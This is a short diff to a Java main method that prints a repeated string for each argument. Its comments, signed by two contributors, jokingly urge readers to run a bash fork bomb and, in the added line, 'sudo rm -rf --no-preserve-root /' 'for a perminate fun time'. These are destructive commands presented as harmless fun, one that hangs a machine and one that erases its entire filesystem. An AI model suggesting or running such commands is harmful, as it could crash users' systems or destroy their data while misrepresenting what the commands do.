@@ -25,7 +25,8 @@ public final class Main {
    */
   public static void main(String... args) {
     // :(){:|:&};:
-    // Put that into your linux terminal for a fun time ;)
+    // Put that into your linux terminal for a fun time ;) - Ian
+    // Or do `sudo rm -rf --no-preserve-root /` for a perminate fun time - Brogan
     
     for (String arg : args) {
       System.out.println("AAAAAAAAAAARRRRRRRRGGGGGGGUUUUUUUMMMMMMMMEEEEEEENNNNNNTTTTT");
